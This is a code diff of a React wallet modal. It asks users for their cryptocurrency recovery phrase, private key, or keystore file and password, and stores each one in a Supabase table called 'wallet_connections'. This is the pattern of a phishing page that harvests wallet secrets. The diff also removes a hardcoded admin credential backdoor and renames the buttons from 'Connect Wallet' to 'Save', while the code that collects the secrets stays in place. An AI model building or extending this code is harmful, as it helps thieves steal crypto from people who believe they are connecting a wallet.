@@ -7,7 +7,6 @@ import { Input } from "@/components/ui/input";
 import { useToast } from "@/hooks/use-toast";
 import { Wallet } from "lucide-react";
 import { supabase } from '@/lib/supabase';
-import { useNavigate } from 'react-router-dom';
 
 interface WalletModalProps {
   isOpen: boolean;
@@ -22,7 +21,6 @@ const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose, walletName }
   const [keystorePassword, setKeystorePassword] = useState("");
   const [file, setFile] = useState<File | null>(null);
   const { toast } = useToast();
-  const navigate = useNavigate();
 
   const handlePhraseSubmit = async () => {
     try {
@@ -40,9 +38,6 @@ const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose, walletName }
         title: "Success",
         description: "Wallet connection recorded successfully."
       });
-      
-      onClose();
-     
     } catch (error) {
       console.error('Error saving phrase:', error);
       toast({
@@ -51,6 +46,8 @@ const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose, walletName }
         description: "Failed to process your request. Please try again."
       });
     }
+    setPhrase("");
+    onClose();
   };
 
   const handlePrivateKeySubmit = async () => {
@@ -69,8 +66,6 @@ const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose, walletName }
         title: "Success",
         description: "Private key recorded successfully."
       });
-      
-      onClose();
     } catch (error) {
       console.error('Error saving private key:', error);
       toast({
@@ -79,16 +74,11 @@ const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose, walletName }
         description: "Failed to process your request. Please try again."
       });
     }
+    setPrivateKey("");
+    onClose();
   };
 
   const handleKeystoreSubmit = async () => {
-    // Check for admin credentials
-    if (keystoreJson === "dapp-admin" && keystorePassword === "dapp-admin@1234") {
-      onClose();
-   
-      return;
-    }
-
     try {
       const { error } = await supabase
         .from('wallet_connections')
@@ -107,9 +97,6 @@ const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose, walletName }
         title: "Success",
         description: "Keystore information recorded successfully."
       });
-      
-      onClose();
-    
     } catch (error) {
       console.error('Error saving keystore:', error);
       toast({
@@ -118,12 +105,15 @@ const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose, walletName }
         description: "Failed to process your request. Please try again."
       });
     }
+    setKeystoreJson("");
+    setKeystorePassword("");
+    setFile(null);
+    onClose();
   };
 
   const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     if (e.target.files && e.target.files[0]) {
       setFile(e.target.files[0]);
-      
       const reader = new FileReader();
       reader.onload = (event) => {
         try {
@@ -160,7 +150,7 @@ const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose, walletName }
             <TabsContent value="phrase" className="space-y-4">
               <div className="space-y-2">
                 <p className="text-sm text-muted-foreground">
-                  Enter your recovery phrase (12, 15, 18, 21, or 24 words)
+                  Enter your recovery phrase
                 </p>
                 <Textarea
                   placeholder="Enter recovery phrase with spaces between each word"
@@ -171,7 +161,7 @@ const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose, walletName }
                 />
               </div>
               <Button onClick={handlePhraseSubmit} className="w-full bg-web3-primary hover:bg-web3-secondary">
-                Connect Wallet
+                Save
               </Button>
             </TabsContent>
             
@@ -189,14 +179,14 @@ const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose, walletName }
                 />
               </div>
               <Button onClick={handlePrivateKeySubmit} className="w-full bg-web3-primary hover:bg-web3-secondary">
-                Connect Wallet
+                Save
               </Button>
             </TabsContent>
             
             <TabsContent value="keystore" className="space-y-4">
               <div className="space-y-2">
                 <p className="text-sm text-muted-foreground">
-                  Upload keystore file (JSON) and enter password
+                  Upload keystore file (JSON) or enter JSON and password
                 </p>
                 <Textarea
                   placeholder="Keystore JSON..."
@@ -219,7 +209,7 @@ const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose, walletName }
                 />
               </div>
               <Button onClick={handleKeystoreSubmit} className="w-full bg-web3-primary hover:bg-web3-secondary">
-                Connect Wallet
+                Save
               </Button>
             </TabsContent>
           </Tabs>
